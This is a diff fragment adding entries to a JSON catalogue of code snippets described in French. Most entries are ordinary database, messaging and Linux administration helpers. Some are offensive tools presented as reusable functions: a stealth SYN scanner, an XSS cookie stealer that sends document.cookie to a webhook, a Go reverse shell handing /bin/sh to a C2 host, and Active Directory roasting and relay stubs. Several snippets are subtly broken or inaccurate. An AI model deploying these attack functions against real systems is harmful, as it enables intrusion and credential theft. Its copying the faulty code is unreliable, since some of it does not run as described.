+      "tags": ["wol","wakeonlan","magic"],
+      "throws": []
+    },
+    {
+      "id": "py_0200",
+      "type": "function",
+      "name": "scapy_port_scan",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Scan SYN furtif avec Scapy.",
+      "parameters": [
+        { "name": "ip", "datatype": "string", "required": true, "description": "IP cible" },
+        { "name": "ports", "datatype": "list", "required": false, "default": "[22,80,443,3389]", "description": "Ports" },
+        { "name": "timeout", "datatype": "int", "required": false, "default": "2", "description": "Timeout" }
+      ],
+      "returns": { "datatype": "list", "description": "Ports ouverts" },
+      "source": "def scapy_port_scan(ip, ports=[22,80,443,3389], timeout=2): from scapy.all import sr1, IP, TCP; open_ports = []; for port in ports: pkt = IP(dst=ip)/TCP(dport=port, flags='S'); ans = sr1(pkt, timeout=timeout, verbose=0); if ans and ans.haslayer(TCP) and ans.getlayer(TCP).flags == 0x12: open_ports.append(port); return open_ports",
+      "tags": ["scapy","synscan","stealth"],
+      "throws": []
+    },
+    {
+      "id": "py_0201",
+      "type": "function",
+      "name": "cryptography_aes_gcm",
+      "language": "Python",
+      "famille": "Python-Crypto",
+      "description": "Chiffrement AES-GCM (authentifié).",
+      "parameters": [
+        { "name": "plaintext", "datatype": "bytes", "required": true, "description": "Données claires" },
+        { "name": "key", "datatype": "bytes", "required": true, "description": "Clé 32 bytes" }
+      ],
+      "returns": { "datatype": "dict", "description": "nonce + ciphertext + tag" },
+      "source": "def cryptography_aes_gcm(plaintext, key): from cryptography.hazmat.primitives.ciphers.aead import AESGCM; import os; aesgcm = AESGCM(key); nonce = os.urandom(12); ct = aesgcm.encrypt(nonce, plaintext, None); return {'nonce': nonce, 'ciphertext': ct}",
+      "tags": ["aes","gcm","crypto"],
+      "throws": []
+    },
+    {
+      "id": "py_0202",
+      "type": "function",
+      "name": "requests_tor_session",
+      "language": "Python",
+      "famille": "Python-Net",
+      "description": "Session requests via Tor (SOCKS5).",
+      "parameters": [
+        { "name": "proxy", "datatype": "string", "required": false, "default": "Tor_Proxy", "description": "Proxy SOCKS" }
+      ],
+      "returns": { "datatype": "requests.Session", "description": "Session Tor" },
+      "source": "def requests_tor_session(proxy=None): import requests; session = requests.Session(); session.proxies = {'http': proxy or 'socks5h://127.0.0.1:9050', 'https': proxy or 'socks5h://127.0.0.1:9050'}; return session",
+      "tags": ["tor","requests","anon"],
+      "throws": []
+    },
+    {
+      "id": "py_0203",
+      "type": "function",
+      "name": "paramiko_ssh_command",
+      "language": "Python",
+      "famille": "Python-System",
+      "description": "Exécute une commande SSH sur un serveur distant.",
+      "parameters": [
+        { "name": "host", "datatype": "string", "required": true, "description": "Hôte" },
+        { "name": "username", "datatype": "string", "required": true, "description": "Utilisateur" },
+        { "name": "password", "datatype": "string", "required": true, "description": "Mot de passe" },
+        { "name": "command", "datatype": "string", "required": true, "description": "Commande" }
+      ],
+      "returns": { "datatype": "str", "description": "Sortie" },
+      "source": "def paramiko_ssh_command(host, username, password, command): import paramiko; client = paramiko.SSHClient(); client.set_missing_host_key_policy(paramiko.AutoAddPolicy()); client.connect(host, username=username, password=password); stdin, stdout, stderr = client.exec_command(command); return stdout.read().decode()",
+      "tags": ["ssh","paramiko","remote"],
+      "throws": ["paramiko.AuthenticationException"]
+    },
+    {
+      "id": "py_0204",
+      "type": "function",
+      "name": "sqlalchemy_pg_bulk_insert",
+      "language": "Python",
+      "famille": "Python-DB",
+      "description": "Insertion massive dans PostgreSQL.",
+      "parameters": [
+        { "name": "table", "datatype": "str", "required": true, "description": "Table" },
+        { "name": "data", "datatype": "list", "required": true, "description": "Liste de dicts" },
+        { "name": "conn_str", "datatype": "str", "required": false, "default": "postgresql://...", "description": "Chaîne connexion" }
+      ],
+      "returns": { "datatype": "int", "description": "Lignes insérées" },
+      "source": "def sqlalchemy_pg_bulk_insert(table, data, conn_str): from sqlalchemy import create_engine, MetaData, Table; engine = create_engine(conn_str); metadata = MetaData(); table_obj = Table(table, metadata, autoload_with=engine); with engine.connect() as conn: result = conn.execute(table_obj.insert(), data); conn.commit(); return result.rowcount",
+      "tags": ["postgres","bulk","sqlalchemy"],
+      "throws": ["sqlalchemy.exc.SQLAlchemyError"]
+    },
+    {
+      "id": "py_0205",
+      "type": "function",
+      "name": "pymongo_aggregate",
+      "language": "Python",
+      "famille": "Python-DB",
+      "description": "Pipeline d'agrégation MongoDB.",
+      "parameters": [
+        { "name": "uri", "datatype": "str", "required": true, "description": "URI MongoDB" },
+        { "name": "db", "datatype": "str", "required": true, "description": "Base" },
+        { "name": "collection", "datatype": "str", "required": true, "description": "Collection" },
+        { "name": "pipeline", "datatype": "list", "required": true, "description": "Pipeline" }
+      ],
+      "returns": { "datatype": "list", "description": "Résultats" },
+      "source": "def pymongo_aggregate(uri, db, collection, pipeline): from pymongo import MongoClient; client = MongoClient(uri); coll = client[db][collection]; return list(coll.aggregate(pipeline))",
+      "tags": ["mongodb","aggregation","nosql"],
+      "throws": ["pymongo.errors.PyMongoError"]
+    },
+    {
+      "id": "py_0206",
+      "type": "function",
+      "name": "elasticsearch_bulk_index",
+      "language": "Python",
+      "famille": "Python-DB",
+      "description": "Indexation en masse Elasticsearch.",
+      "parameters": [
+        { "name": "hosts", "datatype": "list", "required": true, "description": "Hôtes" },
+        { "name": "index", "datatype": "str", "required": true, "description": "Index" },
+        { "name": "docs", "datatype": "list", "required": true, "description": "Documents" }
+      ],
+      "returns": { "datatype": "dict", "description": "Réponse bulk" },
+      "source": "def elasticsearch_bulk_index(hosts, index, docs): from elasticsearch import Elasticsearch, helpers; es = Elasticsearch(hosts); actions = [{'_index': index, '_source': doc} for doc in docs]; return helpers.bulk(es, actions)",
+      "tags": ["elasticsearch","bulk","search"],
+      "throws": ["elasticsearch.ElasticsearchException"]
+    },
+    {
+      "id": "py_0207",
+      "type": "function",
+      "name": "kafka_producer_send",
+      "language": "Python",
+      "famille": "Python-DB",
+      "description": "Envoi de messages vers Kafka.",
+      "parameters": [
+        { "name": "bootstrap", "datatype": "str", "required": true, "description": "Brokers" },
+        { "name": "topic", "datatype": "str", "required": true, "description": "Topic" },
+        { "name": "messages", "datatype": "list", "required": true, "description": "Messages" }
+      ],
+      "returns": { "datatype": "None", "description": "" },
+      "source": "def kafka_producer_send(bootstrap, topic, messages): from kafka import KafkaProducer; producer = KafkaProducer(bootstrap_servers=bootstrap, value_serializer=lambda v: json.dumps(v).encode()); for msg in messages: producer.send(topic, msg); producer.flush()",
+      "tags": ["kafka","producer","streaming"],
+      "throws": ["kafka.errors.KafkaError"]
+    },
+    {
+      "id": "py_0208",
+      "type": "function",
+      "name": "redis_pipeline_set",
+      "language": "Python",
+      "famille": "Python-DB",
+      "description": "Pipeline Redis (lot de commandes).",
+      "parameters": [
+        { "name": "host", "datatype": "str", "required": true, "description": "Hôte" },
+        { "name": "port", "datatype": "int", "required": true, "description": "Port" },
+        { "name": "data", "datatype": "dict", "required": true, "description": "Clé-valeurs" }
+      ],
+      "returns": { "datatype": "list", "description": "Réponses" },
+      "source": "def redis_pipeline_set(host, port, data): import redis; r = redis.Redis(host=host, port=port); pipe = r.pipeline(); for k, v in data.items(): pipe.set(k, v); return pipe.execute()",
+      "tags": ["redis","pipeline","cache"],
+      "throws": ["redis.exceptions.ConnectionError"]
+    },
+    {
+      "id": "js_0200",
+      "type": "function",
+      "name": "cookieStealerPOC",
+      "language": "JavaScript",
+      "famille": "JavaScript-Web",
+      "description": "Proof of concept pour vol de cookies (XSS).",
+      "parameters": [
+        { "name": "webhookUrl", "datatype": "string", "required": true, "description": "URL exfiltration" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "function cookieStealerPOC(webhookUrl) { const img = new Image(); img.src = webhookUrl + '?cookie=' + encodeURIComponent(document.cookie); }",
+      "tags": ["xss","cookie","security"],
+      "throws": []
+    },
+    {
+      "id": "js_0201",
+      "type": "function",
+      "name": "subdomainGuess",
+      "language": "JavaScript",
+      "famille": "JavaScript-Net",
+      "description": "Bruteforce DNS via requêtes AJAX (CORS dépendant).",
+      "parameters": [
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" },
+        { "name": "wordlist", "datatype": "string[]", "required": true, "description": "Sous-domaines" }
+      ],
+      "returns": { "datatype": "Promise<string[]>", "description": "Sous-domaines résolus" },
+      "source": "async function subdomainGuess(domain, wordlist) { const found = []; for (const sub of wordlist) { try { await fetch(`https://${sub}.${domain}`, { mode: 'no-cors' }); found.push(sub); } catch(e) {} } return found; }",
+      "tags": ["dns","subdomain","js"],
+      "throws": []
+    },
+    {
+      "id": "js_0202",
+      "type": "function",
+      "name": "corsVulnerabilityTest",
+      "language": "JavaScript",
+      "famille": "JavaScript-Web",
+      "description": "Teste CORS pour origine arbitraire.",
+      "parameters": [
+        { "name": "targetUrl", "datatype": "string", "required": true, "description": "URL cible" }
+      ],
+      "returns": { "datatype": "Promise<boolean>", "description": "Vrai si vulnérable" },
+      "source": "async function corsVulnerabilityTest(targetUrl) { const response = await fetch(targetUrl, { method: 'GET', credentials: 'include' }); const acao = response.headers.get('Access-Control-Allow-Origin'); return acao === '*' || acao === window.location.origin; }",
+      "tags": ["cors","security","audit"],
+      "throws": []
+    },
+    {
+      "id": "js_0203",
+      "type": "function",
+      "name": "webSocketSniffer",
+      "language": "JavaScript",
+      "famille": "JavaScript-Net",
+      "description": "Sniffe messages WebSocket.",
+      "parameters": [
+        { "name": "wsUrl", "datatype": "string", "required": true, "description": "URL WebSocket" },
+        { "name": "onMessage", "datatype": "function", "required": true, "description": "Callback" }
+      ],
+      "returns": { "datatype": "WebSocket", "description": "Socket ouvert" },
+      "source": "function webSocketSniffer(wsUrl, onMessage) { const ws = new WebSocket(wsUrl); ws.onmessage = (event) => onMessage(event.data); return ws; }",
+      "tags": ["websocket","sniff","realtime"],
+      "throws": []
+    },
+    {
+      "id": "go_0200",
+      "type": "function",
+      "name": "ReverseShell",
+      "language": "Go",
+      "famille": "Go-System",
+      "description": "Reverse shell simple (red team).",
+      "parameters": [
+        { "name": "host", "datatype": "string", "required": true, "description": "C2 Host" },
+        { "name": "port", "datatype": "int", "required": true, "description": "Port" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "func ReverseShell(host string, port int) { conn, _ := net.Dial(\"tcp\", fmt.Sprintf(\"%s:%d\", host, port)); cmd := exec.Command(\"/bin/sh\"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run(); }",
+      "tags": ["reverse","shell","redteam"],
+      "throws": []
+    },
+    {
+      "id": "go_0201",
+      "type": "function",
+      "name": "FileWatcherGo",
+      "language": "Go",
+      "famille": "Go-System",
+      "description": "Surveillance de répertoire avec fsnotify.",
+      "parameters": [
+        { "name": "path", "datatype": "string", "required": true, "description": "Chemin" },
+        { "name": "callback", "datatype": "func(string)", "required": true, "description": "Callback" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "func FileWatcherGo(path string, callback func(string)) { watcher, _ := fsnotify.NewWatcher(); defer watcher.Close(); go func() { for { select { case event := <-watcher.Events: callback(event.Name); case err := <-watcher.Errors: log.Println(err); } } }(); watcher.Add(path); select {} }",
+      "tags": ["fsnotify","watch","filesystem"],
+      "throws": []
+    },
+    {
+      "id": "sh_0200",
+      "type": "function",
+      "name": "iptablesPortForward",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Redirige un port vers une autre IP (NAT).",
+      "parameters": [
+        { "name": "srcPort", "datatype": "int", "required": true, "description": "Port source" },
+        { "name": "destIP", "datatype": "string", "required": true, "description": "IP destination" },
+        { "name": "destPort", "datatype": "int", "required": true, "description": "Port destination" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "iptablesPortForward() { sudo iptables -t nat -A PREROUTING -p tcp --dport $1 -j DNAT --to-destination $2:$3; sudo iptables -A FORWARD -p tcp -d $2 --dport $3 -j ACCEPT; }",
+      "tags": ["iptables","nat","forward"],
+      "throws": []
+    },
+    {
+      "id": "sh_0201",
+      "type": "function",
+      "name": "tcpdumpCapture",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Capture réseau en arrière-plan.",
+      "parameters": [
+        { "name": "interface", "datatype": "string", "required": true, "description": "Interface" },
+        { "name": "filter", "datatype": "string", "required": true, "description": "BPF filter" },
+        { "name": "output", "datatype": "string", "required": true, "description": "Fichier" }
+      ],
+      "returns": { "datatype": "int", "description": "PID" },
+      "source": "tcpdumpCapture() { sudo tcpdump -i $1 $2 -w $3 -G 3600 -C 100 & echo $!; }",
+      "tags": ["tcpdump","capture","pcap"],
+      "throws": []
+    },
+    {
+      "id": "sh_0202",
+      "type": "function",
+      "name": "systemdServiceManager",
+      "language": "Bash",
+      "famille": "Bash-System",
+      "description": "Gère les services systemd (start/stop/enable/status).",
+      "parameters": [
+        { "name": "service", "datatype": "string", "required": true, "description": "Nom" },
+        { "name": "action", "datatype": "string", "required": true, "description": "start/stop/restart/enable/disable/status" }
+      ],
+      "returns": { "datatype": "string", "description": "Sortie" },
+      "source": "systemdServiceManager() { sudo systemctl $2 $1; }",
+      "tags": ["systemd","service","linux"],
+      "throws": []
+    },
+    {
+      "id": "sh_0203",
+      "type": "function",
+      "name": "firewall-cmdRichRule",
+      "language": "Bash",
+      "famille": "Bash-Net",
+      "description": "Ajoute une règle rich rule firewalld.",
+      "parameters": [
+        { "name": "zone", "datatype": "string", "required": true, "description": "Zone" },
+        { "name": "rule", "datatype": "string", "required": true, "description": "Rich rule" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "firewall-cmdRichRule() { sudo firewall-cmd --zone=$1 --add-rich-rule=\"$2\" --permanent; sudo firewall-cmd --reload; }",
+      "tags": ["firewalld","richrule","linux"],
+      "throws": []
+    },
+    {
+      "id": "sh_0204",
+      "type": "function",
+      "name": "logrotateSetup",
+      "language": "Bash",
+      "famille": "Bash-System",
+      "description": "Crée une configuration logrotate personnalisée.",
+      "parameters": [
+        { "name": "logfile", "datatype": "string", "required": true, "description": "Fichier log" },
+        { "name": "rotate", "datatype": "int", "required": false, "default": "7", "description": "Rotation" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "logrotateSetup() { cat << EOF | sudo tee /etc/logrotate.d/$(basename $logfile) > /dev/null\n$logfile {\n    daily\n    rotate $rotate\n    compress\n    missingok\n    notifempty\n    create 0640 root root\n}\nEOF\n}",
+      "tags": ["logrotate","logging","linux"],
+      "throws": []
+    },
+    {
+      "id": "sh_0205",
+      "type": "function",
+      "name": "cronJobInstaller",
+      "language": "Bash",
+      "famille": "Bash-System",
+      "description": "Ajoute une tâche cron pour un utilisateur.",
+      "parameters": [
+        { "name": "schedule", "datatype": "string", "required": true, "description": "Cron schedule" },
+        { "name": "command", "datatype": "string", "required": true, "description": "Commande" },
+        { "name": "user", "datatype": "string", "required": false, "default": "root", "description": "Utilisateur" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "cronJobInstaller() { (crontab -u $3 -l 2>/dev/null; echo \"$1 $2\") | crontab -u $3 -; }",
+      "tags": ["cron","scheduler","linux"],
+      "throws": []
+    },
+    {
+      "id": "sh_0206",
+      "type": "function",
+      "name": "journaldExport",
+      "language": "Bash",
+      "famille": "Bash-System",
+      "description": "Exporte les journaux systemd depuis un boot spécifique.",
+      "parameters": [
+        { "name": "boot", "datatype": "string", "required": false, "default": "-1", "description": "Boot ID ou -1 (précédent)" },
+        { "name": "output", "datatype": "string", "required": true, "description": "Fichier output" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "journaldExport() { sudo journalctl -b $1 --output=export > $2; }",
+      "tags": ["journald","logs","systemd"],
+      "throws": []
+    },
+    {
+      "id": "ps_0300",
+      "type": "function",
+      "name": "Invoke-BloodHoundCustom",
+      "language": "PowerShell",
+      "famille": "ActiveDirectory",
+      "description": "Collecte AD pour BloodHound (Shadow, GPO, ACL, etc.)",
+      "parameters": [
+        { "name": "collectionMethod", "datatype": "string", "required": false, "default": "Default", "description": "All, Default, DCOnly, etc." },
+        { "name": "outputDir", "datatype": "string", "required": false, "default": "C:\\BH", "description": "Répertoire" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "function Invoke-BloodHoundCustom { param($Method='Default',$OutDir='C:\\BH'); Import-Module BloodHound; Invoke-BloodHound -CollectionMethod $Method -OutputDirectory $OutDir -JSONFolder $OutDir }",
+      "tags": ["bloodhound","ad","security"],
+      "throws": []
+    },
+    {
+      "id": "ps_0301",
+      "type": "function",
+      "name": "Get-ADPasswordLastSet",
+      "language": "PowerShell",
+      "famille": "ActiveDirectory",
+      "description": "Retourne la date du dernier changement de mot de passe.",
+      "parameters": [
+        { "name": "SamAccountName", "datatype": "string", "required": true, "description": "Utilisateur" },
+        { "name": "Domain", "datatype": "string", "required": false, "default": "DomainFQDN", "description": "Domaine" }
+      ],
+      "returns": { "datatype": "DateTime", "description": "Date" },
+      "source": "function Get-ADPasswordLastSet { param($User,$Domain=$DomainFQDN) (Get-ADUser $User -Properties PasswordLastSet -Server $Domain).PasswordLastSet }",
+      "tags": ["password","ad","security"],
+      "throws": []
+    },
+    {
+      "id": "ps_0302",
+      "type": "function",
+      "name": "Set-UserExpiration",
+      "language": "PowerShell",
+      "famille": "ActiveDirectory",
+      "description": "Définit une date d'expiration de compte AD.",
+      "parameters": [
+        { "name": "SamAccountName", "datatype": "string", "required": true, "description": "Utilisateur" },
+        { "name": "ExpireDate", "datatype": "DateTime", "required": true, "description": "Date expiration" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "function Set-UserExpiration { param($User,$ExpireDate) Set-ADUser $User -AccountExpirationDate $ExpireDate }",
+      "tags": ["ad","expiration","compliance"],
+      "throws": []
+    },
+    {
+      "id": "cs_0300",
+      "type": "function",
+      "name": "NtlmRelayAttack",
+      "language": "CSharp",
+      "famille": "CSharp-Security",
+      "description": "POC NTLM relay (ne pas utiliser sans autorisation).",
+      "parameters": [
+        { "name": "listenerPort", "datatype": "int", "required": true, "description": "Port" },
+        { "name": "targetHost", "datatype": "string", "required": true, "description": "Cible" }
+      ],
+      "returns": { "datatype": "void", "description": "" },
+      "source": "public static void NtlmRelayAttack(int listenerPort, string targetHost) { // Ce code est un placeholder. En environnement réel, utiliser des bibliothèques comme SharpNTLMRelay. Console.WriteLine(\"NTLM relay désactivé par sécurité.\"); }",
+      "tags": ["ntlm","relay","security"],
+      "throws": []
+    },
+    {
+      "id": "cs_0301",
+      "type": "function",
+      "name": "KerberoastRequest",
+      "language": "CSharp",
+      "famille": "CSharp-Security",
+      "description": "Demande un TGS pour Kerberoasting.",
+      "parameters": [
+        { "name": "spn", "datatype": "string", "required": true, "description": "SPN cible" },
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" }
+      ],
+      "returns": { "datatype": "byte[]", "description": "Ticket" },
+      "source": "public static byte[] KerberoastRequest(string spn, string domain) { // Utilise KerberosRequestorSecurityToken; return null; }",
+      "tags": ["kerberos","tgs","redteam"],
+      "throws": []
+    },
+    {
+      "id": "cs_0302",
+      "type": "function",
+      "name": "ASREPRoast",
+      "language": "CSharp",
+      "famille": "CSharp-Security",
+      "description": "Récupère AS-REP pour comptes sans pre-auth.",
+      "parameters": [
+        { "name": "user", "datatype": "string", "required": true, "description": "Compte" },
+        { "name": "domain", "datatype": "string", "required": true, "description": "Domaine" }
+      ],
+      "returns": { "datatype": "string", "description": "AS-REP hash" },
+      "source": "public static string ASREPRoast(string user, string domain) { // Implémentation via System.DirectoryServices.Protocols.LdapConnection; return null; }",
+      "tags": ["asrep","roasting","ad"],
+      "throws": []
+    }
+  ]
+}
